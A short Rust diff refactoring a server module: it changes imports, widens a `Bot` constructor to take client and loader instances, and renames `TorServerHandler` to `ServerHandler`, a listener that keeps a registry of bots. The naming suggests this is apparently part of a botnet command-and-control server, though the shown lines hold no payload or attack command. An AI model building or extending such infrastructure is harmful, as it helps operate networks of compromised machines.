@@ -23,8 +23,8 @@ use tokio::sync::Mutex;
 use tokio::sync::RwLock;
 use std::sync::Arc;
 use client_vars::types::structs::BotState;
-use super::client::route_client;
-use super::loader::route_loader;
+use crate::router::client::route_client;
+use crate::router::loader::route_loader;
 use super::sanitization::verify_id_and_version;
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -51,31 +51,36 @@ pub struct Bot {
 }
 
 impl Bot {
-    pub fn new(id: String) -> Self {
+    pub fn new(
+        id: String,
+        client_instances: Vec<ClientInstance>,
+        loader_instances: Vec<LoaderInstance>,
+        verified: bool
+    ) -> Self {
         Bot {
             id,
-            client_instances: Vec::new(),
-            loader_instances: Vec::new(),
-            verified: false,
-            join_date: Utc::now().to_string(),
+            client_instances,
+            loader_instances,
+            verified,
+            join_date: Utc::now().to_rfc3339(),
         }
     }
 }
 pub type BotMap = HashMap<String, Bot>;
 
 #[derive(Debug, Clone)]
-pub struct TorServerHandler {
+pub struct ServerHandler {
     listener: Arc<RwLock<TcpListener>>,
     pub bot_map: Arc<RwLock<BotMap>>,
 }
 
-impl TorServerHandler {
+impl ServerHandler {
     pub async fn new() -> Result<Self> {
         let addr = SocketAddr::from(([127, 0, 0, 1], 80));
 
         let listener = TcpListener::bind(addr).await?;
 
-        Ok(TorServerHandler {
+        Ok(ServerHandler {
             listener: Arc::new(RwLock::new(listener)),
             bot_map: Arc::new(RwLock::new(HashMap::new())),
         })
